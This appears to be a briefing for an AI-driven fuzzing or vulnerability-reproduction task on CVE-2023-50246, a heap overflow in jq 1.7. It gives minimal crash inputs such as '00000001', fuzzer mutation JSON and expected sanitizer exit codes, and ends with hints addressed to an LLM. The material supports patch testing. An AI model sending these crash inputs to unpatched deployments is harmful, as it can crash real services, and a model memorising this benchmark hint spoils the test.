# CVE-2023-50246: Complete Technical Context

## Official Advisory Summary

**CVE ID:** CVE-2023-50246  
**Type:** Heap-based buffer overflow (CWE-122)  
**Component:** jq JSON processor - decimal number library  
**Function:** `decToString` in `src/decNumber/decNumber.c`  
**Trigger:** Raw numeric input with leading zeros

**References:**
- GitHub Advisory: GHSA-686w-5m7m-54vc
- Fix Commit: `71c2ab509a8628dbbad4bc7b3f98a64aa90d3297`
- Fixed Release: jq 1.7.1

## ⚠️ CRITICAL: Minimal Crash Pattern Discovered

### The Simplest Crash Input

The vulnerability can be triggered with just **8 bytes**:

```
00000001
```

**Hex representation:** `30 30 30 30 30 30 30 31`

| Version | Input | Output | Exit Code |
|---------|-------|--------|-----------|
| **Vulnerable (jq 1.7)** | `00000001` | UBSan/ASan crash | **134** |
| **Fixed (jq 1.7.1)** | `00000001` | `1` | **0** |

### Why This Works

- jq attempts to parse raw input as a number
- Leading zeros (`00000001`) trigger a code path in `decToString`
- Buffer size is miscalculated, causing heap overflow
- ASan detects the overflow and aborts

## Precise Mutation Strategy

### SIMPLE: Just replace the seed with ASCII digits

Starting seed: `{"n": 1}` (9 bytes)

**Minimal crash mutation:**
```json
{
  "mutations": [
    {"op": "overwrite_range", "offset": 0, "hex": "3030303030303031"}
  ],
  "rationale": "Replace input with raw digits: 00000001"
}
```

**Hex to ASCII reference:**
- `30` = '0' (digit zero)
- `31` = '1' (digit one)
- `3030303030303031` = "00000001"

### Alternative patterns that also crash:

```json
// Pattern 1: More leading zeros
{"op": "overwrite_range", "offset": 0, "hex": "30303030303030303030303030303031"}
// Creates: 0000000000000001

// Pattern 2: With space and negative
{"op": "overwrite_range", "offset": 0, "hex": "3030303030303031202d3030313030"}
// Creates: 00000001 -00100

// Pattern 3: Many zeros
{"op": "overwrite_range", "offset": 0, "hex": "3030303030303030303030303030303030303030"}
// Creates: 00000000000000000000
```

## Expected Outcomes

**Vulnerable (jq 1.7):** 
- Exit code: **134** (SIGABRT from sanitizer)
- stderr contains: `UndefinedBehaviorSanitizer` or `AddressSanitizer`
- stderr contains: `runtime error` or `Aborted`

**Fixed (jq 1.7.1):** 
- Exit code: **0** (success)
- stdout: Outputs the parsed number (e.g., `1`)
- NO sanitizer output

## Key Insight for LLM

**DO NOT create valid JSON with extreme numbers** - that causes timeout.

**DO create raw ASCII digit strings with leading zeros:**
- Just overwrite the seed with hex bytes `30` (for '0') and `31` (for '1')
- 8 or more bytes of digits is enough to trigger the crash
- The simplest crash is: `00000001` → hex: `3030303030303031`
